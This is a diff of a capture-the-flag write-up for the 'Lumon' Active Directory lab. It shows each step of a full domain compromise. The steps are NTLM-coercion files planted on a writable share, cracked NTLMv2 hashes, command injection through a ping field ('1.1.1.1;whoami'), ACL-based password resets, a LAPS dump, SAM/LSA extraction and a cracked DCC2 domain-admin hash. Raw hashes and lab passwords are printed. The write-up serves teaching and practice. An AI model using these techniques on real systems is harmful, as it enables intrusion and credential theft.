@@ -36,7 +36,7 @@ For the purposes of this evaluation, you will be provided the assigned credentia
 
 ### Credential Validation and Host Configuration
 
-Starting the engagement by validating the provided credentials and generating host file entries using UwU Toolkit's netexec module:
+To start, I used UwU Toolkit to generate the host file and validate the provided credentials:
 
 ```
 UwU Toolkit > use nxc
@@ -66,22 +66,21 @@ UwU Toolkit netexec > run
 [+] Module completed successfully
 ```
 
-The credentials are valid. Key observations:
-- **INTRANET** - Windows Server 2025 Build 26100
-- **Domain:** lumons.hacksmarter
-- **SMB Signing:** False (potential relay target)
+While waiting for NMAP results to complete, I started enumerating the web server.
 
 ### Web Application Enumeration
 
-The user can authenticate to the Lumon HackSmarter Intranet web portal. The application displays:
-- Upcoming Events (Quarterly Hackathon, Team Retreat, Waffle Party, etc.)
-- Waffle Party Winners
-- Quarterly Recognition teams
-- Microdata Updates about Quadrant 5 activity
+The user is able to authenticate to the webserver:
+
+![Lumon Intranet Login](/assets/images/ctf/lumon/login.png)
+
+After authenticating, the Lumon HackSmarter Intranet home page is displayed:
+
+![Lumon Intranet Home](/assets/images/ctf/lumon/intranet-home.png)
 
 ### SMB Share Enumeration
 
-Enumerating accessible SMB shares with the initial credentials:
+Additional enumeration on the user shares shows MDRepo:
 
 ```
 UwU Toolkit netexec > set action shares
@@ -105,17 +104,15 @@ SMB 10.1.188.43 445 INTRANET IPC$ READ Remote IPC
 SMB 10.1.188.43 445 INTRANET MDRepo READ,WRITE
 ```
 
-The `MDRepo` share has **READ,WRITE** permissions - this is a critical finding for potential NTLM coercion attacks.
-
-### Share Content Analysis
-
-Exploring the MDRepo share contents:
+Enumerating the shares we see two files. Let's pull these and see if we can identify anything interesting:
 
 ```
 Exegol > smbclient.py 'hellyr':'H3lenaR!2025'@10.1.188.43
 Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies
 
 Type help for list of commands
+# shartes
+*** Unknown syntax: shartes
 # shares
 ADMIN$
 C$
@@ -127,25 +124,40 @@ drw-rw-rw- 0 Fri Jan 23 10:39:47 2026 .
 drw-rw-rw- 0 Sun Oct 12 09:40:05 2025 ..
 -rw-rw-rw- 131 Sun Oct 12 10:57:18 2025 Lumons Intranet.url
 -rw-rw-rw- 539001 Sun Oct 12 12:02:10 2025 Lumons_International.pdf
+#
 ```
 
-The PDF contains valuable information:
+We have a couple potential users in the PDF:
 
 ```
 For managerial needs worldwide, contact: harmonyc@lumons.hacksmarter
 For IT assistance, contact: IT-Support@lumons.hacksmarter
 This page is a supplemental internal communication. Replace the placeholder image with
 an actual screenshot before distribution.
+```
 
+This information also looks promising:
+
+```
 How to Request Access To Admin & Terminal Panel(s) (Internal)
 Submit an access request via the Lumons internal portal (Seoul Annex > Access
 Requests). Requests require manager approval and a documented research rationale.
 External collaborators must provide institutional affiliation and a letter of intent.
 ```
 
-Potential users identified:
-- **harmonyc** - Manager contact
-- **IT-Support** - IT assistance
+### Cookie Analysis
+
+Taking a look at the cookie we can see is_admin is set to false. We can try to manipulate the cookie:
+
+![Cookie Decode](/assets/images/ctf/lumon/cookie-decode.png)
+
+```
+eyJpc19hZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiaGVsbHlyIn0
+
+Decoded: {"is_admin":false,"username":"hellyr"}
+```
+
+This did not work. Let's continue to figure out how to make this user an admin.
 
 ### Web Directory Enumeration
 
@@ -170,6 +182,7 @@ by Ben "epi" Risher                  ver: 2.13.0
  HTTP methods          │ [GET]
  Insecure              │ true
  Recursion Depth       │ 4
+ New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
 ───────────────────────────┴──────────────────────
  Press [ENTER] to use the Scan Management Menu
 ──────────────────────────────────────────────────
@@ -187,30 +200,15 @@ by Ben "epi" Risher                  ver: 2.13.0
 [####################] - 9s 4751/4751 545/s https://lumons.hacksmarter/
 ```
 
-Key findings:
-- `/admin` - 403 Forbidden (restricted)
-- `/terminal` - 403 Forbidden (restricted)
-- `/login` - Login page
-
-### Cookie Analysis
-
-Examining the session cookie after authenticating as hellyr:
-
-```
-eyJpc19hZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiaGVsbHlyIn0
-
-Decoded: {"is_admin":false,"username":"hellyr"}
-```
-
-Cookie manipulation to set `is_admin:true` did not work - additional authentication is required for admin access.
+Everything was access denied.
 
 ---
 
 ## Initial Access - NTLM Coercion
 
-### Exploiting Writable Share
+Earlier we identified that the MDRepo had read/write. Let's test if I can attempt to coerce an NTLM hash using UwU Toolkit.
 
-Since the MDRepo share has READ,WRITE access, we can upload NTLM coercion files to capture hashes when users browse the share. Using UwU Toolkit's ntlm_coerce module:
+### Testing the ntlm_coerce Module
 
 ```
 UwU Toolkit ntlm_coerce > run
@@ -286,7 +284,7 @@ ntlmrelayx.py -tf targets.txt -smb2support
 
 ### Capturing harmonyc Hash
 
-With Responder running, we capture harmonyc's NTLMv2 hash when they browse the share:
+Using Responder, we identify the hash:
 
 ```
 [SMB] NTLMv2-SSP Client : 10.1.188.43
@@ -300,9 +298,11 @@ CFB291B1C8A492C42BC0A00100000000000000000000000000000000000090024006300690066007
 000000000000000000
 ```
 
+Let's try to add a new feature to UwU to automatically execute all the NTLMv2 capture and cracking.
+
 ### Automated Hash Capture and Cracking
 
-Using UwU Toolkit's ntlm_coerce module with AUTO_CRACK and AUTO_RESPONDER enabled:
+Testing the new module in UwU for ntlm_coerce:
 
 ```
 UwU Toolkit ntlm_coerce > options
@@ -342,17 +342,110 @@ UwU Toolkit ntlm_coerce > run
 [*] Cleared previous Responder captures
 [+] Responder started successfully
 [*] Running ntlm_theft...
+Are you sure to want to delete @important? [Y/N]
 [+] ntlm_theft completed successfully
 [*] Also generating CVE-2025-24054 / CVE-2025-24071 payloads...
 [+] Created: @important.library-ms (CVE-2025-24054/24071)
 [+] Created: @important_icon.library-ms (icon reference variant)
 [+] Created: @important.searchConnector-ms
-[+] Generated 25 file(s)
+[+] Generated 25 file(s):
+@important.library-ms
+@important-(externalcell).xlsx
+@important-(frameset).docx
+@important-(fulldocx).xml
+@important-(handler).htm
+@important-(icon).url
+@important-(includepicture).docx
+@important-(remotetemplate).docx
+@important-(stylesheet).xml
+@important-(url).url
+@important.application
+@important.asx
+@important.htm
+@important.jnlp
+@important.library-ms
+@important.lnk
+@important.m3u
+@important.pdf
+@important.rtf
+@important.scf
+@important.theme
+@important.wax
+Autorun.inf
+desktop.ini
+@important_icon.library-ms
 [*] Uploading to \\10.1.188.43\MDRepo...
-[+] Uploaded all files
+[+] Uploaded: @important.library-ms
+[+] Uploaded: @important-(externalcell).xlsx
+[+] Uploaded: @important-(frameset).docx
+[+] Uploaded: @important-(fulldocx).xml
+[+] Uploaded: @important-(handler).htm
+[+] Uploaded: @important-(icon).url
+[+] Uploaded: @important-(includepicture).docx
+[+] Uploaded: @important-(remotetemplate).docx
+[+] Uploaded: @important-(stylesheet).xml
+[+] Uploaded: @important-(url).url
+[+] Uploaded: @important.application
+[+] Uploaded: @important.asx
+[+] Uploaded: @important.htm
+[+] Uploaded: @important.jnlp
+[+] Uploaded: @important.library-ms
+[+] Uploaded: @important.lnk
+[+] Uploaded: @important.m3u
+[+] Uploaded: @important.pdf
+[+] Uploaded: @important.rtf
+[+] Uploaded: @important.scf
+[+] Uploaded: @important.theme
+[+] Uploaded: @important.wax
+[+] Uploaded: Autorun.inf
+[+] Uploaded: desktop.ini
+[+] Uploaded: @important_icon.library-ms
 [*] Waiting up to 60s for hash capture (Ctrl+C to stop)...
 [+] Captured NTLMv2 hash:
-LUMONS:1122334455667788:80BCFA2CB9146E77ADF9CDAF4939FF69:0101000000000000003913A35F8CDC014D36E8F229ACAB3A...
+LUMONS:1122334455667788:80BCFA2CB9146E77ADF9CDAF4939FF69:0101000000000000003913A35F8CDC014D36E8F229ACAB3A0000000002000800550052004E003000
+01001E00570049004E002D005900350046004500360054004B00330037003600500004003400570049004E002D005900350046004500360054004B0033003700360050002
+E00550052004E0030002E004C004F00430041004C0003001400550052004E0030002E004C004F00430041004C0005001400550052004E0030002E004C004F00430041004C
+0007000800003913A35F8CDC01060004000200000008003000300000000000000000000000003000005727C65AEC39744ADF2C874ED4F5BD6B625C3A8CBB0DACFB291B1C8
+A492C42BC0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330031002E0031003800370000000000
+00000000\harmonyc
+[+] Captured NTLMv2 hash:
+LUMONS:1122334455667788:DED50FD95AF4FDE44463B99006D4E958:0101000000000000003913A35F8CDC01FB1ADDFA7F7D6C4D0000000002000800550052004E003000
+01001E00570049004E002D005900350046004500360054004B00330037003600500004003400570049004E002D005900350046004500360054004B0033003700360050002
+E00550052004E0030002E004C004F00430041004C0003001400550052004E0030002E004C004F00430041004C0005001400550052004E0030002E004C004F00430041004C
+0007000800003913A35F8CDC01060004000200000008003000300000000000000000000000003000005727C65AEC39744ADF2C874ED4F5BD6B625C3A8CBB0DACFB291B1C8
+A492C42BC0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330031002E0031003800370000000000
+00000000\harmonyc
+[+] Captured NTLMv2 hash:
+LUMONS:1122334455667788:48A7205494223BD242BFC4E2917C97F9:0101000000000000003913A35F8CDC0130225038383470640000000002000800550052004E003000
+01001E00570049004E002D005900350046004500360054004B00330037003600500004003400570049004E002D005900350046004500360054004B0033003700360050002
+E00550052004E0030002E004C004F00430041004C0003001400550052004E0030002E004C004F00430041004C0005001400550052004E0030002E004C004F00430041004C
+0007000800003913A35F8CDC01060004000200000008003000300000000000000000000000003000005727C65AEC39744ADF2C874ED4F5BD6B625C3A8CBB0DACFB291B1C8
+A492C42BC0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330031002E0031003800370000000000
+00000000\harmonyc
+[+] Captured NTLMv2 hash:
+LUMONS:1122334455667788:76332B69290B3CF317D3148C27B5E1E4:0101000000000000003913A35F8CDC01D6D19F2400B1A7670000000002000800550052004E003000
+01001E00570049004E002D005900350046004500360054004B00330037003600500004003400570049004E002D005900350046004500360054004B0033003700360050002
+E00550052004E0030002E004C004F00430041004C0003001400550052004E0030002E004C004F00430041004C0005001400550052004E0030002E004C004F00430041004C
+0007000800003913A35F8CDC01060004000200000008003000300000000000000000000000003000005727C65AEC39744ADF2C874ED4F5BD6B625C3A8CBB0DACFB291B1C8
+A492C42BC0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330031002E0031003800370000000000
+00000000\harmonyc
+[*] Waiting... 45s remaining
+[*] Waiting... 30s remaining
+[*] Waiting... 15s remaining
+[+] Captured NTLMv2 hash:
+LUMONS:1122334455667788:E6C5CC3C6518C7D36E7F04F8612D06A1:0101000000000000003913A35F8CDC01F64053F43EC34FA60000000002000800550052004E003000
+01001E00570049004E002D005900350046004500360054004B00330037003600500004003400570049004E002D005900350046004500360054004B0033003700360050002
+E00550052004E0030002E004C004F00430041004C0003001400550052004E0030002E004C004F00430041004C0005001400550052004E0030002E004C004F00430041004C
+0007000800003913A35F8CDC01060004000200000008003000300000000000000000000000003000005727C65AEC39744ADF2C874ED4F5BD6B625C3A8CBB0DACFB291B1C8
+A492C42BC0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330031002E0031003800370000000000
+00000000\harmonyc
+[+] Captured NTLMv2 hash:
+LUMONS:1122334455667788:67D829028501FECEA219FBF7E964B653:0101000000000000003913A35F8CDC01D8F60680E6BAEE960000000002000800550052004E003000
+01001E00570049004E002D005900350046004500360054004B00330037003600500004003400570049004E002D005900350046004500360054004B0033003700360050002
+E00550052004E0030002E004C004F00430041004C0003001400550052004E0030002E004C004F00430041004C0005001400550052004E0030002E004C004F00430041004C
+0007000800003913A35F8CDC01060004000200000008003000300000000000000000000000003000005727C65AEC39744ADF2C874ED4F5BD6B625C3A8CBB0DACFB291B1C8
+A492C42BC0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330031002E0031003800370000000000
+00000000\harmonyc
 [+] Captured 6 new hash(es)
 harmonyc::LUMONS:1122334455667788:80BCFA2CB9146E77ADF9CDAF4939FF69:0101000000000...
 harmonyc::LUMONS:1122334455667788:DED50FD95AF4FDE44463B99006D4E958:0101000000000...
@@ -363,18 +456,50 @@ harmonyc::LUMONS:1122334455667788:67D829028501FECEA219FBF7E964B653:0101000000000
 [*] Attempting to crack captured hashes...
 [*] Running hashcat (NTLMv2 mode 5600)...
 [+] Cracked passwords:
-HARMONYC::LUMONS:1122334455667788:80bcfa2cb9146e77adf9cdaf4939ff69:...:h@rmony08
-HARMONYC::LUMONS:1122334455667788:ded50fd95af4fde44463b99006d4e958:...:h@rmony08
-HARMONYC::LUMONS:1122334455667788:48a7205494223bd242bfc4e2917c97f9:...:h@rmony08
-HARMONYC::LUMONS:1122334455667788:76332b69290b3cf317d3148c27b5e1e4:...:h@rmony08
-HARMONYC::LUMONS:1122334455667788:e6c5cc3c6518c7d36e7f04f8612d06a1:...:h@rmony08
-HARMONYC::LUMONS:1122334455667788:67d829028501fecea219fbf7e964b653:...:h@rmony08
+HARMONYC::LUMONS:1122334455667788:80bcfa2cb9146e77adf9cdaf4939ff69:0101000000000000003913a35f8cdc014d36e8f229acab3a0000000002000800550052
+004e00300001001e00570049004e002d005900350046004500360054004b00330037003600500004003400570049004e002d005900350046004500360054004b003300370
+0360050002e00550052004e0030002e004c004f00430041004c0003001400550052004e0030002e004c004f00430041004c0005001400550052004e0030002e004c004f00
+430041004c0007000800003913a35f8cdc01060004000200000008003000300000000000000000000000003000005727c65aec39744adf2c874ed4f5bd6b625c3a8cbb0da
+cfb291b1c8a492c42bc0a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330031002e003100380037
+000000000000000000:h@rmony08
+HARMONYC::LUMONS:1122334455667788:ded50fd95af4fde44463b99006d4e958:0101000000000000003913a35f8cdc01fb1addfa7f7d6c4d0000000002000800550052
+004e00300001001e00570049004e002d005900350046004500360054004b00330037003600500004003400570049004e002d005900350046004500360054004b003300370
+0360050002e00550052004e0030002e004c004f00430041004c0003001400550052004e0030002e004c004f00430041004c0005001400550052004e0030002e004c004f00
+430041004c0007000800003913a35f8cdc01060004000200000008003000300000000000000000000000003000005727c65aec39744adf2c874ed4f5bd6b625c3a8cbb0da
+cfb291b1c8a492c42bc0a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330031002e003100380037
+000000000000000000:h@rmony08
+HARMONYC::LUMONS:1122334455667788:48a7205494223bd242bfc4e2917c97f9:0101000000000000003913a35f8cdc0130225038383470640000000002000800550052
+004e00300001001e00570049004e002d005900350046004500360054004b00330037003600500004003400570049004e002d005900350046004500360054004b003300370
+0360050002e00550052004e0030002e004c004f00430041004c0003001400550052004e0030002e004c004f00430041004c0005001400550052004e0030002e004c004f00
+430041004c0007000800003913a35f8cdc01060004000200000008003000300000000000000000000000003000005727c65aec39744adf2c874ed4f5bd6b625c3a8cbb0da
+cfb291b1c8a492c42bc0a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330031002e003100380037
+000000000000000000:h@rmony08
+HARMONYC::LUMONS:1122334455667788:76332b69290b3cf317d3148c27b5e1e4:0101000000000000003913a35f8cdc01d6d19f2400b1a7670000000002000800550052
+004e00300001001e00570049004e002d005900350046004500360054004b00330037003600500004003400570049004e002d005900350046004500360054004b003300370
+0360050002e00550052004e0030002e004c004f00430041004c0003001400550052004e0030002e004c004f00430041004c0005001400550052004e0030002e004c004f00
+430041004c0007000800003913a35f8cdc01060004000200000008003000300000000000000000000000003000005727c65aec39744adf2c874ed4f5bd6b625c3a8cbb0da
+cfb291b1c8a492c42bc0a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330031002e003100380037
+000000000000000000:h@rmony08
+HARMONYC::LUMONS:1122334455667788:e6c5cc3c6518c7d36e7f04f8612d06a1:0101000000000000003913a35f8cdc01f64053f43ec34fa60000000002000800550052
+004e00300001001e00570049004e002d005900350046004500360054004b00330037003600500004003400570049004e002d005900350046004500360054004b003300370
+0360050002e00550052004e0030002e004c004f00430041004c0003001400550052004e0030002e004c004f00430041004c0005001400550052004e0030002e004c004f00
+430041004c0007000800003913a35f8cdc01060004000200000008003000300000000000000000000000003000005727c65aec39744adf2c874ed4f5bd6b625c3a8cbb0da
+cfb291b1c8a492c42bc0a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330031002e003100380037
+000000000000000000:h@rmony08
+HARMONYC::LUMONS:1122334455667788:67d829028501fecea219fbf7e964b653:0101000000000000003913a35f8cdc01d8f60680e6baee960000000002000800550052
+004e00300001001e00570049004e002d005900350046004500360054004b00330037003600500004003400570049004e002d005900350046004500360054004b003300370
+0360050002e00550052004e0030002e004c004f00430041004c0003001400550052004e0030002e004c004f00430041004c0005001400550052004e0030002e004c004f00
+430041004c0007000800003913a35f8cdc01060004000200000008003000300000000000000000000000003000005727c65aec39744adf2c874ed4f5bd6b625c3a8cbb0da
+cfb291b1c8a492c42bc0a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330031002e003100380037
+000000000000000000:h@rmony08
 [*] Responder stopped
 ```
 
-**Cracked credentials:** `harmonyc:h@rmony08`
+We identify **h@rmony08** for HARMONYC.
 
 ### Validating New Credentials
+
+Let's add and verify the new creds:
 
 ```
 UwU Toolkit ntlm_coerce > creds set HARMONYC h@rmony08
@@ -397,7 +522,7 @@ UwU Toolkit netexec > run
 
 ### Domain Controller Discovery
 
-Adding the DC to our hosts file:
+Let's add in the DC to our /etc/hosts file:
 
 ```
 UwU Toolkit netexec > set GENERATE_HOSTS yes
@@ -421,8 +546,6 @@ UwU Toolkit netexec > run
 ```
 
 ### BloodHound Collection
-
-Collecting comprehensive AD data using bloodhound-ce.py:
 
 ```
 UwU Toolkit bloodhound_collect > set RUSTHOUND no
@@ -451,6 +574,7 @@ UwU Toolkit bloodhound_collect > run
 [*] ZIP file saved - check current directory
 [*] Import the output into BloodHound CE for analysis
 [+] Module completed successfully
+UwU Toolkit bloodhound_collect >
 ```
 
 ---
@@ -459,19 +583,15 @@ UwU Toolkit bloodhound_collect > run
 
 ### Admin Panel Access
 
-After authenticating to the intranet as harmonyc, we now have access to the Admin Panel with several features:
-- **Unlock AD Account** - Username input
-- **Ping Server** - IP address input
-- **Browse File Share** - Directory path input
+After authenticating to the intranet as harmonyc, we have admin panel access and limited terminal:
+
+![Admin Panel](/assets/images/ctf/lumon/admin-panel.png)
 
 ### Command Injection Discovery
 
-Testing the "Ping Server" functionality with command injection:
+Pinging `1.1.1.1;whoami` shows that we are executing as intranetsvc:
 
 ```
-Input: 1.1.1.1;whoami
-
-Output:
 Pinging 1.1.1.1 with 32 bytes of data:
 Request timed out.
 Ping statistics for 1.1.1.1:
@@ -479,14 +599,9 @@ Packets: Sent = 1, Received = 0, Lost = 1 (100% loss),
 lumons\intranetsvc
 ```
 
-**Command injection confirmed!** The web application is running as `lumons\intranetsvc`.
-
-### Directory Enumeration via Command Injection
+We have command injection!
 
 ```
-Input: 1.1.1.1;dir
-
-Output:
 Pinging 1.1.1.1 with 32 bytes of data:
 Request timed out.
 Ping statistics for 1.1.1.1:
@@ -508,20 +623,11 @@ d----- 10/9/2025 8:59 PM __pycache__
 -a---- 10/11/2025 3:05 AM 1694 web.config
 ```
 
-### Capturing intranetsvc Hash via File Browser
+### Capturing intranetsvc Hash
 
-Using the "Browse File Share" feature to coerce the intranetsvc hash:
-
-```
-Input: \\10.200.31.187\test
-```
-
-Responder captures the hash:
+Using the Browse File System we can target it to our Responder at `\\10.200.31.187\test`:
 
 ```
-[SMB] NTLMv2-SSP Client : 10.1.188.43
-[SMB] NTLMv2-SSP Username : LUMONS\IntranetSvc
-[SMB] NTLMv2-SSP Hash :
 IntranetSvc::LUMONS:1122334455667788:D59CFB6C64E0C43C275472EABF81214F:010100000000000000BDCBB0658CDC01E153E3E8C92061270000000002000800560
 037004A00360001001E00570049004E002D005100510058005500540059005800370056005A00420004003400570049004E002D0051005100580055005400590058003700
 56005A0042002E00560037004A0036002E004C004F00430041004C0003001400560037004A0036002E004C004F00430041004C0005001400560037004A0036002E004C004
@@ -530,36 +636,34 @@ F00430041004C000700080000BDCBB0658CDC0106000400020000000800300030000000000000000
 037000000000000000000
 ```
 
-### Cracking intranetsvc Hash
-
-Using UwU hashcrack:
+Using UwU hashcrack we can crack the hash instantly:
 
 ```
-=== CRACKED ===
-INTRANETSVC::LUMONS:1122334455667788:d59cfb6c64e0c43c275472eabf81214f:...:Servicesince1979
+INTRANETSVC::LUMONS:1122334455667788:d59cfb6c64e0c43c275472eabf81214f:010100000000000000bdcbb0658cdc01e153e3e8c92061270000000002000800560
+037004a00360001001e00570049004e002d005100510058005500540059005800370056005a00420004003400570049004e002d0051005100580055005400590058003700
+56005a0042002e00560037004a0036002e004c004f00430041004c0003001400560037004a0036002e004c004f00430041004c0005001400560037004a0036002e004c004
+f00430041004c000700080000bdcbb0658cdc01060004000200000008003000300000000000000001000000002000005727c65aec39744adf2c874ed4f5bd6b625c3a8cbb
+0dacfb291b1c8a492c42bc0a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330031002e003100380
+037000000000000000000:Servicesince1979
 ```
-
-**Cracked credentials:** `intranetsvc:Servicesince1979`
 
 ---
 
 ## ACL Abuse - ForceChangePassword
 
-### BloodHound Path Analysis
+### BloodHound Analysis
 
-BloodHound analysis reveals that `INTRANETSVC` has the **ForceChangePassword** privilege over multiple users:
-- PETERK@LUMONS.HACKSMARTER
-- MARKS@LUMONS.HACKSMARTER
-- HELLYR@LUMONS.HACKSMARTER
-- JBROWN@LUMONS.HACKSMARTER
-- SMARTINEZ@LUMONS.HACKSMARTER
-- CHERNANDEZ@LUMONS.HACKSMARTER
+INTRANETSVC can change the password of different users:
 
-Further analysis shows that **MARKS** and **PETERK** are members of the **LAPSADMINS** group, which can read LAPS passwords.
+![ForceChangePassword ACL](/assets/images/ctf/lumon/intranetsvc-forcechangepassword.png)
+
+MARKS and PETERK are members of LAPSADMINS so let's change their passwords:
+
+![MARKS LAPSADMINS Membership](/assets/images/ctf/lumon/marks-lapsadmins.png)
 
 ### Password Reset via bloodyAD
 
-Using UwU Toolkit's bloody_setpass module to reset the passwords:
+I changed both users passwords using UwU bloody_setpass:
 
 ```
 [+] Using module: auxiliary/bloody_setpass
@@ -607,6 +711,9 @@ UwU Toolkit bloody_setpass > run
 [*] Command: bloodyAD -u INTRANETSVC -p [HIDDEN] -d lumons.hacksmarter --host 10.1.250.54 set password peterk [HIDDEN]
 [+] Password changed successfully!
 [+] New credentials: peterk:Password123
+[*] Next steps:
+[*] setg USER peterk
+[*] setg PASS Password123
 [+] Module completed successfully
 ```
 
@@ -614,7 +721,9 @@ UwU Toolkit bloody_setpass > run
 
 ## LAPS Exploitation
 
-### WinRM Access as marks
+### WinRM Access
+
+We can use WinRM to access INTRANET to capture the first flag:
 
 ```
 Evil-WinRM shell v3.7
@@ -635,7 +744,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
 
 ### Dumping LAPS Password
 
-Using Impacket's GetLAPSPassword.py:
+Then use Impacket to dump the LAPS password:
 
 ```
 Exegol > GetLAPSPassword.py lumons.hacksmarter/marks:Password123 -dc-ip 10.1.250.54
@@ -646,11 +755,11 @@ Host       LAPS Username  LAPS Password              LAPS Password Expiration  L
 INTRANET$  localadmin    DoseAxisWickTastyGlassHelp 2026-02-22 10:23:15       True
 ```
 
-**LAPS Password:** `localadmin:DoseAxisWickTastyGlassHelp`
+### Local Administrator Access
 
-### Local Admin Access and Privilege Escalation
+We can RDP as the local admin and then add marks into the admin group. I was not able to execute anything with localadmin remotely:
 
-RDP as localadmin to the INTRANET server, then add marks to local administrators:
+![RDP Local Admin](/assets/images/ctf/lumon/rdp-localadmin.png)
 
 ```
 C:\Windows\System32>net localgroup administrators marks /add
@@ -663,7 +772,7 @@ The command completed successfully.
 
 ### SAM and LSA Dump
 
-With marks now a local administrator, dumping SAM and LSA secrets:
+Now we can use nxc or secretsdump to dump the SAM and LSA:
 
 ```
 Exegol > nxc smb 10.1.188.43 -u marks -p 'Password123'
@@ -700,43 +809,34 @@ SMB 10.1.188.43 445 INTRANET LUMONS\INTRANET$:aad3b435b51404eeaad3b435b51404ee:c
 SMB 10.1.188.43 445 INTRANET dpapi_machinekey:0xb1c72f324c3529f33e6e8f55b8b2e07a62f06c52
 dpapi_userkey:0x8a91f8d527a2aecbdb427de852923989e1f906db
 SMB 10.1.188.43 445 INTRANET LUMONS\harmonyc:h@rmony08
-SMB 10.1.188.43 445 INTRANET [+] Dumped 12 LSA secrets to /root/.nxc/logs/lsa/INTRANET_10.1.188.43_2026-01-23_142210.secrets
+SMB 10.1.188.43 445 INTRANET [+] Dumped 12 LSA secrets to /root/.nxc/logs/lsa/INTRANET_10.1.188.43_2026-01-23_142210.secrets and /root/.nxc/logs/lsa/INTRANET_10.1.188.43_2026-01-23_142210.cached
+Exegol >
 ```
 
 ### DCC2 Hash Discovery
 
-The LSA dump reveals a cached DCC2 hash for user **hellye**:
-
-```
-LUMONS.HACKSMARTER/hellye:$DCC2$10240#hellye#62da21b55a047cda1bf1bebb132e48c9
-```
-
-### Cracking Domain Admin Hash
-
-Using hashcat mode 2100 (DCC2) or UwU hashcrack:
+We have the DCC2 Hash for hellye who is a domain admin:
 
 ```
 Exegol > cat hall
 $DCC2$10240#hellye#62da21b55a047cda1bf1bebb132e48c9
+```
 
+### Cracking Domain Admin Hash
+
+Then use hashcrack in UwU or hashcat 2100:
+
+```
 === CRACKED ===
 $DCC2$10240#hellye#62da21b55a047cda1bf1bebb132e48c9:Security&system
 Connection to 172.17.0.1 closed.
 ```
 
-**Domain Admin credentials:** `hellye:Security&system`
-
 ### Domain Owned
 
-RDP to the Domain Controller as hellye:
+Now we can RDP as hellye and own the domain:
 
-```
-Target: 10.1.250.54 (DC01)
-User: hellye
-Password: Security&system
-```
-
-Root flag retrieved from `C:\Users\Administrator\Desktop\root.txt`.
+![DC01 Root Flag](/assets/images/ctf/lumon/dc01-root.png)
 
 ---
 
